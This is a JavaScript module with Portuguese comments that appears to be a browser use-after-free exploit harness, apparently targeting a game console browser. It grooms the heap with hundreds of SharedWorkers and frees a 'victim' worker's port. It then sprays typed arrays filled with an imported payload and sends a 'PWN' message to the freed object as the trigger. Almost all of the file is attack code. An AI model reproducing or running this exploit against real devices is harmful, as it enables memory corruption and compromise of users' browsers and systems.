import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { prepare_checkerboard_heap } from './heap.mjs'; // Mantém o seu heap.mjs atual
import { build_universal_payload } from './payloads.mjs';

var workers = [];

export async function init() {
    document.getElementById("btn_run").addEventListener("click", start_clean_test);
    log("Sistema pronto. Limite configurado: " + CONFIG.WORKER_LIMIT, "success");
}

async function start_clean_test() {
    if (!window.SharedWorker) return log("Erro: Navegador.", "fail");
    
    // Tamanho fixo de 0x2000 (8KB) - Padrão Lapse/Estabilidade
    const PAYLOAD_SIZE = 0x2000;
    const payload = build_universal_payload(PAYLOAD_SIZE);
    
    log(">>> INICIANDO TESTE LIMPO (406) <<<", "warn");

    // 1. Preparar Heap
    prepare_checkerboard_heap(PAYLOAD_SIZE);

    // 2. Encher até a borda (400)
    log("Grooming inicial...");
    for(let i=0; i<400; i++) {
        try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
    }

    // 3. Aproximação Lenta (400 -> 406)
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 400;

    const interval = setInterval(() => {
        // CHEGAMOS NO LIMITE CRÍTICO
        if (p_count >= limit) {
            clearInterval(interval);
            
            log("!!! ALVO 406 ALCANÇADO !!!", "fail");
            
            // Ação Imediata
            const victim = workers.pop(); // Pega o 406
            victim.port.close();          // FREE
            
            // Spray Probabilístico
            log("Injetando Rainbow Payload...");
            const spray = [];
            for(let k=0; k<CONFIG.SPRAY_QUANTITY; k++) {
                spray.push(new Uint32Array(payload));
            }
            
            // Gatilho
            try { victim.port.postMessage("PWN"); } catch(e){}

            log("AGUARDANDO CONGELAMENTO...", "warn");
            log("Se o console travar e NÃO desligar: SUCESSO.");
            return;
        }

        try {
            let w = new SharedWorker("data:text,1", "v"+p_count);
            w.port.start();
            workers.push(w);
            log(`Worker ${401+p_count} alocado.`);
        } catch(e) {
            log("Erro na alocação: " + e);
        }
        
        p_count++;
    }, 150);
}
